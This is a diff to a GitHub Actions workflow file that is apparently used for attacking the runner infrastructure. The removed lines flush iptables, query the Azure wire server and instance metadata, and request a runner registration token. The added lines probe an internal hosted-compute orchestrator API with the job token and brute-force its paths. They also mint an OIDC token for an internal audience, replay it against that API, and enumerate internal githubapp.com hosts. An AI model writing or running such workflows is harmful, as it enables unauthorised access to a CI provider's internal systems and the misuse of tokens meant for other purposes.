@@ -1,42 +1,69 @@
-name: Wire
+name: Internal API
 on: push
 jobs:
-  wire:
+  api:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
     env:
       GITHUB_TOKEN: ${{ github.token }}
     steps:
-      - name: Wire server with iptables flush
+      - name: Probe internal hosted compute API
         run: |
-          sudo iptables -F INPUT
-          sudo iptables -F OUTPUT
-          sudo iptables -P INPUT ACCEPT
-          sudo iptables -P OUTPUT ACCEPT
-          echo "Flushed iptables"
-          echo "Testing wire server..."
-          curl -v --connect-timeout 10 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -c 2000
-      - name: Advanced IMDS
+          BASE="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1"
+          echo "=== UNAUTHENTICATED ACCESS ==="
+          curl -sv "$BASE" 2>&1 | head -30
+          echo ""
+          curl -sv "$BASE/" 2>&1 | head -30
+          echo ""
+          echo "=== WITH GITHUB_TOKEN ==="
+          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" "$BASE" 2>&1 | head -c 500
+          echo ""
+          echo "=== WITH GITHUB_TOKEN as token ==="
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "$BASE" 2>&1 | head -c 500
+          echo ""
+          echo "=== DISCOVER ENDPOINTS ==="
+          for path in "/" "/health" "/status" "/api" "/vm" "/vms" "/allocations" "/quota" "/.well-known/openid-configuration"; do
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$path")
+            echo "  $path -> HTTP $CODE"
+          done
+      - name: OIDC token for internal audience
         run: |
-          curl -sH "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2025-11-11" | python3 -c "
-          import json,sys
-          d=json.load(sys.stdin)
-          c=d.get('compute',{})
-          print(f'vmId: {c.get(\"vmId\")}')
-          print(f'vmScaleSetName: {c.get(\"vmScaleSetName\",\"none\")}')
-          print(f'zone: {c.get(\"zone\",\"none\")}')
-          print(f'tagsList: {c.get(\"tagsList\",\"none\")}')
-          print(f'publicKeys: {c.get(\"publicKeys\",[])}')
-          "
-      - name: Runner registration token
+          echo "=== OIDC token with internal audience ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "Requesting token for api://hosted-compute-ro"
+            OIDC_RESP=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro")
+            OIDC_TOKEN=$(echo "$OIDC_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value','FAILED'))" 2>/dev/null)
+            if [ "$OIDC_TOKEN" != "FAILED" ] && [ -n "$OIDC_TOKEN" ]; then
+              echo "GOT OIDC TOKEN for internal audience!"
+              echo "$OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
+              echo ""
+              echo "=== USING INTERNAL OIDC TOKEN AGAINST HOSTED COMPUTE API ==="
+              BASE="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1"
+              curl -s -H "Authorization: Bearer $OIDC_TOKEN" "$BASE" 2>&1 | head -c 1000
+              echo ""
+              for path in "/" "/allocations" "/vms" "/quota"; do
+                CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $OIDC_TOKEN" "$BASE$path")
+                echo "  $path -> HTTP $CODE"
+              done
+            else
+              echo "Failed to get OIDC token: $OIDC_RESP"
+            fi
+            echo ""
+            echo "=== STANDARD OIDC TOKEN CLAIMS ==="
+            STD_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+            echo "$STD_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
+          else
+            echo "OIDC not available"
+          fi
+      - name: Test all known internal URLs
         run: |
-          curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners/registration-token" | python3 -c "
-          import json,sys
-          d=json.load(sys.stdin)
-          if 'token' in d:
-              t=d['token']
-              print(f'REG_TOKEN: {t[:8]}...{t[-4:]}')
-              print(f'Expires: {d.get(\"expires_at\")}')
-          else:
-              print(f'Blocked: {d.get(\"message\",\"?\")}')
-          "
+          echo "=== TESTING GITHUBAPP.COM SUBDOMAINS ==="
+          for sub in "hosted-compute-request-orchestrator-prod-eus-02" "hosted-compute-request-orchestrator-prod-wus-02" "hosted-compute-request-orchestrator-prod" "actions-results-receiver-production" "pipelines"; do
+            IP=$(dig +short "${sub}.githubapp.com" | head -1)
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "https://${sub}.githubapp.com" 2>/dev/null)
+            echo "  ${sub}.githubapp.com -> $IP HTTP:$CODE"
+          done
